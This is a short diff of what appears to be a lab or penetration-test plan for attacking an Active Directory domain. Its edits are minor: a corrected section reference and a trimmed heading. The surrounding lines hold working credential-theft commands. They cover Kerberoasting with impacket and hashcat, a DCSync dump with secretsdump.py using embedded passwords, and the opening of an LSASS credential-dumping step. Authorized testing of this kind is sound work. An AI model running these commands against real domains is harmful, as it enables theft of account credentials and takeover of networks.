@@ -55,12 +55,12 @@ impacket-GetUserSPNs corpnet.local/j.melnyk:'P@ssw0rd123' -dc-ip 192.168.100.1 \
 hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt
 ```
 #### 3.2 AS-REP Roasting
-Already executed during recon (Section 3.2) — inherently a single unauthenticated request, no separate exploitation step.
+Already executed during recon (Section 1.2) — inherently a single unauthenticated request, no separate exploitation step.
 #### 3.3 DCSync
 ```bash
 secretsdump.py corpnet.local/svc-monitor:'Monitor2024!'@192.168.100.1
 ```
-#### 3.4 LSASS Credential Dumping (New — Attack #4)
+#### 3.4 LSASS Credential Dumping
 Precondition check — confirm you actually have local admin before attempting this:
 ```bash
 # From KALI-ATK, using credentials obtained from an earlier step (e.g. cracked Kerberoasting hash)
